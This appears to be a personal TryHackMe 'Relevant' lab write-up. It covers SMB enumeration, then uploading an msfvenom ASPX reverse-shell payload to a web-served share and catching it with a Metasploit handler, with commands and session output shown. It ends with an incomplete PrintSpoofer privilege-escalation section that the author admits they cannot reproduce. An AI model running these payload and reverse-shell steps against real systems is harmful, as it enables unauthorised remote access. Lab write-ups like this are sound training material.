
enumeration

![nmap scan screenshot ](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20151506.png?raw=true)
![continued nmap screenshot](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20152835.png?raw=true)

```
gobuster dir -u http://10.10.50.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x php,html,txt
```
![gobuster scan](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20152608.png?raw=true)

smb

To show what was listed in the smb share.
```
smbclient -L \\\\10.10.50.140\\
```
```
smbclient  \\\\10.10.10.144\\nt4wrksv
```
![smb](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20154052.png?raw=true)

The `get` command wasn't working. I added a destination for the passwds.txt
![smb transfer file](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20154125.png?raw=true)


The strings needed to be decoded base64
![base64 -d](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20154538.png?raw=true)

RCE vulnerability via an insecure file upload path that uses SMB shares as the storage backend.

For testing I tried to see if i could access the share through a browser. Seeing if 
I could put test.txt into the smb. In the smb share `put text.txt`
![text.txt in browser](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20161907.png?raw=true)


make payload  (note check payload is the same in msfvenom and msfconsole)
```
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.137.19 LPORT=8910 -f aspx -o reverse1.aspx
```
![payload](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20155335.png?raw=true)

in the smb share add   
```
put reverse.aspx
```
![aspx in smb](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20155759.png?raw=true)





browser
```
http://10.10.10.144:49663/nt4wrksv/reverse1.aspx
```
execute the browser and msfconsole 

```
msf6 exploit(multi/handler) > use exploit/multi/handler
[*] Using configured payload windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.137.19
LHOST => 10.10.137.19
msf6 exploit(multi/handler) > set LPORT 8910
LPORT => 8910
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.137.19:8910 
[*] Command shell session 2 opened (10.10.137.19:8910 -> 10.10.10.144:49762) at 2025-05-28 21:24:48 +0100
```=

Shell Banner:
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
-----
          

c:\windows\system32\inetsrv>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\windows\system32\inetsrv
```
msfshell

```
cd c:\Users\Bob\Desktop
```
user.txt

---------------------->>>> priv escalation need to redo. <<<<<----------------- start here to see about exploit
i cant remember how i did it the first time 
Priv Escalation

```
whoami /priv
```
SeImpersonatePrivilege

location of the smb directory 
```
c:\inetpub\wwwroot\nt4wrksv
```
https://github.com/itm4n/PrintSpoofer

i can use metasploit for it. bg session 

```
search printspooler

use 4

sessions

set session 1

run

```
need to upgrade meterpreter shell 
```
use post/multi/manage/shell_to_meterpreter

set session 1

run
```
now need to run the printspooler again




#I couldnt get the smb share to copy the file over to my machine and still not sure of the error
